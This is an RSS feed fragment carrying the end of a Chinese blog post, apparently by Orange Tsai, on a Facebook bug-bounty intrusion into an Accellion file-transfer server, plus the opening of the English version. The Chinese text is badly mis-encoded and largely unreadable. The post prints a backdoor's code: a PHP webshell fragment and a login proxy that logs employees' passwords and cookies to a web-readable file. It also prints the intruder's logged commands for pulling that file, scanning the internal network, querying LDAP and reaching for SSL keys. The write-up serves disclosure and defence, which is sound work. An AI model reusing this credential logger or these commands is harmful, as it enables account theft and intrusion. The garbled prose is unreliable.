class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;highlight-name&quot;&gt;sclient\_user\_class\_standard.inc&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sclient_user_class_standard.inc.orig&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/home/seos/courier/B3dKe9sQaa0L.log&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
&lt;span class=&quot;nv&quot;&gt;$retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$max_retries&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// ÁúÅÁï•...&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$fp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Y-m-d H:i:s T&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;REMOTE_ADDR&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HTTP_USER_AGENT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;POST=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;GET=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;;COOKIE=&quot;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;http_build_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 

&lt;span class=&quot;c1&quot;&gt;// ÁúÅÁï•...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÂâçÂπæÂÄãÂ∞±ÊòØÂæàÊ®ôÊ∫ñÁöÑ PHP ‰∏ÄÂè•Ë©±Êú®È¶¨&lt;br /&gt;
ÂÖ∂‰∏≠ÊØîËºÉÁâπÂà•ÁöÑÊòØ ‚Äú&lt;strong&gt;sclient_user_class_standard.inc&lt;/strong&gt;‚Äù ÈÄôÂÄãÊ™îÊ°à&lt;/p&gt;

&lt;p&gt;include_once ‰∏≠ ‚Äú&lt;strong&gt;sclient_user_class_standard.inc.orig&lt;/strong&gt;‚Äù ÁÇ∫ÂéüÊú¨Â∞çÂØÜÁ¢ºÈÄ≤Ë°åÈ©óË≠âÁöÑ PHP Á®ãÂºèÔºåÈß≠ÂÆ¢ÂÅö‰∫Ü‰∏ÄÂÄã Proxy Âú®‰∏≠Èñì‰∏¶Âú®ÈÄ≤Ë°å‰∏Ä‰∫õÈáçË¶ÅÊìç‰ΩúÊôÇÂÖàÊää GET, POST, COOKIE ÁöÑÂÄºË®òÈåÑËµ∑‰æÜ&lt;/p&gt;

&lt;p&gt;Êï¥ÁêÜ‰∏Ä‰∏ãÔºåÈß≠ÂÆ¢ÂÅö‰∫Ü‰∏ÄÂÄã Proxy Âú®ÂØÜÁ¢ºÈ©óË≠âÁöÑÂú∞ÊñπÔºå‰∏¶‰∏îË®òÈåÑ Facebook Âì°Â∑•ÁöÑÂ∏≥ËôüÂØÜÁ¢ºÔºå‰∏¶‰∏îÂ∞áË®òÈåÑÂà∞ÁöÑÂØÜÁ¢ºÊîæÁΩÆÂú® Web ÁõÆÈåÑ‰∏ãÔºåÈß≠ÂÆ¢ÊØèÈöî‰∏ÄÊÆµÊôÇÈñì‰ΩøÁî®   wget ÊäìÂèñ&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://files.fb.com/courier/B3dKe9sQaa0L.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/5.jpg&quot; alt=&quot;logged password&quot; /&gt;&lt;br /&gt;
&lt;em&gt;‚Üë Logged passwords&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÂæûÁ¥ÄÈåÑË£°Èù¢ÂèØ‰ª•ÁúãÂà∞Èô§‰∫Ü‰ΩøÁî®ËÄÖÂ∏≥ËôüÂØÜÁ¢ºÂ§ñÔºåÈÇÑÊúâÂæû FTA Ë¶ÅÊ±ÇÊ™îÊ°àÊôÇÁöÑ‰ø°‰ª∂ÂÖßÂÆπÔºåË®òÈåÑÂà∞ÁöÑÂ∏≥ËôüÂØÜÁ¢ºÊúÉÂÆöÊôÇ Rotate (ÂæåÊñáÊúÉÊèêÂèäÔºåÈÄôÈªûÈÇÑÊªøÊ©üËªäÁöÑXD)&lt;/p&gt;

&lt;p&gt;ÁôºÁèæÁï∂‰∏ãÔºåÊúÄËøë‰∏ÄÊ¨°ÁöÑ Rotate Âæû 2/1 Ë®òÈåÑÂà∞ 2/7 ÂÖ±Á¥Ñ 300 Á≠ÜÂ∏≥ËôüÂØÜÁ¢ºÁ¥ÄÈåÑÔºåÂ§ßÂ§öÈÉΩÊòØ ‚Äú&lt;strong&gt;@fb.com&lt;/strong&gt;‚Äù ÊàñÊòØ ‚Äú&lt;strong&gt;@facebook.com&lt;/strong&gt;‚Äù ÁöÑÂì°Â∑•Â∏≥ÂØÜÔºåÁúãÂà∞Áï∂‰∏ãË¶∫Âæó‰∫ãÊÉÖÊúâÈªûÂö¥Èáç‰∫ÜÔºåÂú® FTA ‰∏≠Ôºå‰ΩøÁî®ËÄÖÁöÑÁôªÂÖ•‰∏ªË¶ÅÊúâÂÖ©Á®ÆÊ®°Âºè&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;‰∏ÄËà¨Áî®Êà∂Ë®ªÂÜäÔºåÂØÜÁ¢º Hash Â≠òÂú®Ë≥áÊñôÂ∫´ÔºåÁî± SHA256 + SALT ÂÑ≤Â≠ò&lt;/li&gt;
  &lt;li&gt;Facebook Âì°Â∑• (@fb.com) ÂâáËµ∞Áµ±‰∏ÄË™çË≠âÔºå‰ΩøÁî® LDAP Áî± AD Ë™çË≠â&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Âú®ÈÄôË£°Áõ∏‰ø°Ë®òÈåÑÂà∞ÁöÑÊòØÁúüÂØ¶ÁöÑÂì°Â∑•Â∏≥ËôüÂØÜÁ¢ºÔºå&lt;strong&gt;**ÁåúÊ∏¨&lt;/strong&gt;** ÈÄô‰ªΩÂ∏≥ËôüÂØÜÁ¢ºÊáâË©≤ÂèØ‰ª•ÈÄöË°å Facebook Mail OWA, VPN Á≠âÊúçÂãôÂÅöÊõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÊª≤ÈÄè‚Ä¶&lt;/p&gt;

&lt;p&gt;Ê≠§Â§ñÔºåÈÄôÂêç ‚ÄúÈß≠ÂÆ¢‚Äù ÂèØËÉΩÁøíÊÖ£‰∏çÂ§™Â•Ω :P&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ÂæåÈñÄÂèÉÊï∏ÁöÜ‰ΩøÁî® GET ‰æÜÂÇ≥ÈÅûÔºåÂú®Á∂≤È†ÅÊó•Ë™åÂèØ‰ª•ÂæàÊòéÈ°ØÁöÑÁôºÁèæ‰ªñÁöÑË∂≥Ë∑°&lt;/li&gt;
  &lt;li&gt;Èß≠ÂÆ¢Âú®ÈÄ≤Ë°å‰∏Ä‰∫õÊåá‰ª§Êìç‰ΩúÊôÇÊ≤íÈ°ßÊÖÆÂà∞ STDERR ÔºåÂ∞éËá¥Á∂≤È†ÅÊó•Ë™å‰∏≠ÂæàÂ§öÊåá‰ª§ÁöÑÈåØË™§Ë®äÊÅØÔºåÂæû‰∏≠ÂèØ‰ª•ËßÄÂØüÈß≠ÂÆ¢ÂÅö‰∫ÜÂì™‰∫õÊìç‰Ωú&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;
Âæû access.log ÂèØ‰ª•ËßÄÂØüÂà∞ÁöÑÊØèÈöîÊï∏Êó•Èß≠ÂÆ¢ÊúÉÂ∞áË®òÈåÑÂà∞ÁöÑÂ∏≥ËôüÂØÜÁ¢ºÊ∏ÖÁ©∫&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-prolog&quot; data-lang=&quot;prolog&quot;&gt;&lt;span class=&quot;mf&quot;&gt;192.168&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;54.13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;17955&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Sat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Jan&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2016&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;04&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1453575850&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo &amp;gt; /home/seos/courier/B3dKe9sQaa0L.log&apos; 2&amp;gt;/dev/stdout HTTP/1.1&quot;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2559&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÊâìÂåÖÊ™îÊ°à&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;tmp_list3_2 | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /home/filex2/1000/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; files&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done &lt;/span&gt;2&amp;gt;/dev/stdout
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-czvf&lt;/span&gt; files.tar.gz files&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Â∞çÂÖßÈÉ®Á∂≤Ë∑ØÁµêÊßãÈÄ≤Ë°åÊé¢Ê∏¨&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview&lt;span class=&quot;p&quot;&gt;_&lt;/span&gt;facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p &apos;********&apos; ssh -v -o StrictHostKeyChecking=no soggycat@localhost &apos;for i in &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;201&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt; &lt;/span&gt;&lt;span class=&quot;m&quot;&gt;255&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;; do for j in &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;(seq 0 1 255); do echo &quot;192.168.&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;j:`dig +short ptr &lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;j.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$&lt;/span&gt;i.168.192.in-addr.arpa`&quot;; done; done&apos; 2&amp;gt;/dev/stdout
...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩøÁî® Shell Script ÈÄ≤Ë°åÂÖßÁ∂≤ÊéÉÊèè‰ΩÜÂøòË®òÊää STDERR Â∞éÊéâXD&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/6.jpg&quot; alt=&quot;Port Scanning&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÂòóË©¶Â∞çÂÖßÈÉ® LDAP ÈÄ≤Ë°åÈÄ£Êé•&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-tex&quot; data-lang=&quot;tex&quot;&gt;sh: -c: line 0: syntax error near unexpected token `(&apos;
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w &apos;********&apos; -s base (objectclass=*) 2&amp;gt;/dev/stdout&apos;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÂòóË©¶Ë®™ÂïèÂÖßÈÉ®Á∂≤Ë∑ØË≥áÊ∫ê&lt;br /&gt;
( ÁúãËµ∑‰æÜ Mail OWA ÂèØ‰ª•Áõ¥Êé•Ë®™Âïè ‚Ä¶)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&amp;amp;reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT&apos;

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-&apos; saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÂòóË©¶Â∞ç SSL Private Key ‰∏ãÊâã&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x&apos;: No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÂæûÁÄèË¶ΩÂô®ËßÄÂØü files.fb.com ÁöÑÊÜëË≠âÈÇÑÊòØ Wildcard ÁöÑ *.fb.com ‚Ä¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20160421/7.jpg&quot; alt=&quot;certificate of files.fb.com&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;ÂæåË®ò&quot;&gt;ÂæåË®ò&lt;/h3&gt;

&lt;p&gt;Âú®Êî∂ÈõÜÂÆåË∂≥Â§†Ë≠âÊìöÂæå‰æøÁ´ãÂç≥ÂõûÂ†±Áµ¶ Facebook ÂÆâÂÖ®ÂúòÈöäÔºåÂõûÂ†±ÂÖßÂÆπÈô§‰∫ÜÊºèÊ¥ûÁ¥∞ÁØÄÂ§ñÔºåÈÇÑÈôÑ‰∏äÁõ∏Â∞çÊáâÁöÑ Log „ÄÅÊà™Âúñ‰ª•ÂèäÊôÇÈñìÁ¥ÄÈåÑxD&lt;/p&gt;

&lt;p&gt;Âæû‰º∫ÊúçÂô®‰∏≠ÁöÑÊó•Ë™åÂèØ‰ª•ÁôºÁèæÊúâÂÖ©ÂÄãÊôÇÈñìÈªûÊòØÊòéÈ°ØÈß≠ÂÆ¢Âú®Êìç‰ΩúÁ≥ªÁµ±ÁöÑÊôÇÈñìÔºå‰∏ÄÂÄãÊòØ‰∏ÉÊúàÂàù„ÄÅÂè¶ÂÄãÊòØ‰πùÊúà‰∏≠Êó¨&lt;/p&gt;

&lt;p&gt;‰∏ÉÊúàÂàùÁöÑÂãï‰ΩúÂæûÁ¥ÄÈåÑ‰∏≠‰æÜÁúãËµ∑‰æÜÊØîËºÉÂÅèÂêë ‚ÄúÈÄõ‚Äù ‰º∫ÊúçÂô®Ôºå‰ΩÜ‰πùÊúà‰∏≠Êó¨ÁöÑÊìç‰ΩúÂ∞±ÊØîËºÉÊÉ°ÊÑè‰∫ÜÔºåÈô§‰∫ÜÈÄõË°óÂ§ñÔºåÈÇÑÊîæÁΩÆ‰∫ÜÂØÜÁ¢º Logger Á≠âÔºåËá≥ÊñºÂÖ©ÂÄãÊôÇÈñìÈªûÁöÑ ‚ÄúÈß≠ÂÆ¢‚Äù ÊòØ‰∏çÊòØÂêå‰∏ÄÂÄã‰∫∫Â∞±‰∏çÂæóËÄåÁü•‰∫Ü :P&lt;br /&gt;
ËÄå‰∏ÉÊúàÁôºÁîüÁöÑÊôÇÊ©üÈªûÊ≠£Â•ΩÊé•Ëøë CVE-2015-2857 Exploit ÂÖ¨‰ΩàÂâçÔºåÁ©∂Á´üÊòØÈÄèÈÅé 1-Day ÈÇÑÊòØÁÑ° 0-Day ÂÖ•‰æµÁ≥ªÁµ±‰πüÁÑ°ÂæûÂæóÁü•‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄô‰ª∂‰∫ãÊÉÖÂ∞±Ë®òÈåÑÂà∞ÈÄôË£°ÔºåÁ∏ΩÈ´î‰æÜË™™ÈÄôÊòØ‰∏ÄÂÄãÈùûÂ∏∏ÊúâË∂£ÁöÑÁ∂ìÊ≠∑xD&lt;br /&gt;
‰πüËÆìÊàëÊúâÈÄôÂÄãÊ©üÊúÉÂèØ‰ª•‰æÜÂØ´ÂØ´ÈóúÊñºÊª≤ÈÄèÁöÑ‰∏Ä‰∫õÊñáÁ´† :P&lt;/p&gt;

&lt;p&gt;ÊúÄÂæå‰πüÊÑüË¨ù Bug Bounty ÂèäËÉ∏Ë•üÂØ¨ÈóäÁöÑ Facebook ÂÆâÂÖ®ÂúòÈöä ËÆìÊàëÂèØ‰ª•ÂÆåÊï¥Ë®òÈåÑÈÄôËµ∑‰∫ã‰ª∂ : )&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2016/02/05 20:05 Êèê‰æõÊºèÊ¥ûË©≥ÊÉÖÁµ¶ Facebook ÂÆâÂÖ®ÂúòÈöä&lt;/li&gt;
  &lt;li&gt;2016/02/05 20:08 Êî∂Âà∞Ê©üÂô®‰∫∫Ëá™ÂãïÂõûË¶Ü&lt;/li&gt;
  &lt;li&gt;2016/02/06 05:21 Êèê‰æõÂº±Èªû Advisory Áµ¶ Accellion ÊäÄË°ìÁ™óÂè£&lt;/li&gt;
  &lt;li&gt;2016/02/06 07:42 Êî∂Âà∞ Thomas ÁöÑÂõûË¶ÜÔºåÂëäÁü•Ë™øÊü•‰∏≠&lt;/li&gt;
  &lt;li&gt;2016/02/13 07:43 Êî∂Âà∞ Reginaldo ÁöÑÂõûË¶ÜÔºåÂëäÁü• Bug Bounty ÁçéÈáë $10000 USD&lt;/li&gt;
  &lt;li&gt;2016/02/13 Ë©¢ÂïèÊòØÂê¶Êí∞ÂØ´ Blog ÊòØÂê¶Êúâ‰ªª‰ΩïË¶ÅÊ≥®ÊÑèÁöÑÂú∞Êñπ?&lt;/li&gt;
  &lt;li&gt;2016/02/13 Ë©¢ÂïèÊ≠§ÊºèÊ¥ûË¢´Ë™çÁÇ∫ÊòØ RCE ÈÇÑÊòØ SQL Injection&lt;/li&gt;
  &lt;li&gt;2016/02/18 Êî∂Âà∞ Reginaldo ÁöÑÂõûË¶ÜÔºåÂëäÁü•Ê≠£Âú®ÈÄ≤Ë°åË™øÊü•‰∏≠ÔºåÂ∏åÊúõ Blog ÂÖàÊö´ÊôÇ‰∏çË¶ÅÁôºÂá∫&lt;/li&gt;
  &lt;li&gt;2016/02/24 Êî∂Âà∞ Hai ÁöÑÂõûË¶ÜÔºåÂëäÁü•ÁçéÈáëÂ∞áÊúÉÊñº‰∏âÊúàÁôºÈÄÅ&lt;/li&gt;
  &lt;li&gt;2016/04/20 Êî∂Âà∞ Reginaldo ÁöÑÂõûË¶ÜÔºåÂëäÁü•Ë™øÊü•Â∑≤ÂÆåÊàê&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/</link>
                <guid>https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script</guid>
                <pubDate>Thu, 21 Apr 2016 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>How I Hacked Facebook, and Found Someone's Backdoor Script</title>
                <description>&lt;p&gt;by &lt;a href=&quot;http://blog.orange.tw/&quot;&gt;Orange Tsai&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;How I Hacked Facebook, and Found Someone‚Äôs Backdoor Script&lt;/a&gt; (English Version)&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/&quot;&gt;Êª≤ÈÄè Facebook ÁöÑÊÄùË∑ØËàáÁôºÁèæ&lt;/a&gt; (‰∏≠ÊñáÁâàÊú¨)&lt;/p&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;foreword&quot;&gt;Foreword&lt;/h3&gt;

&lt;p&gt;As a pentester, I love server-side vulnerabilities more than client-side ones. Why? Because it‚Äôs way much cooler to take over the server directly and gain system SHELL privileges. &amp;lt;(Ôø£Ô∏∂Ôø£)&amp;gt;&lt;/p&gt;

&lt;p&gt;Of course, both vulnerabilities from the server-side and the client-side are indispensable in a perfect penetration test. Sometimes, in order to take over the server more elegantly, it also need some client-side vulnerabilities to do the trick. But speaking of finding vulnerabilities, I prefer to find server-side vulnerabilities first.&lt;/p&gt;

&lt;p&gt;With the growing popularity of Facebook around the world, I‚Äôve always been interested in testing the security of Facebook. Luckily, in 2012, Facebook launched the &lt;a href=&quot;https://www.facebook.com/whitehat/&quot;&gt;Bug Bounty Program&lt;/a&gt;, which even motivated me to give it a shot.&lt;/p&gt;

&lt;!-- more --&gt;

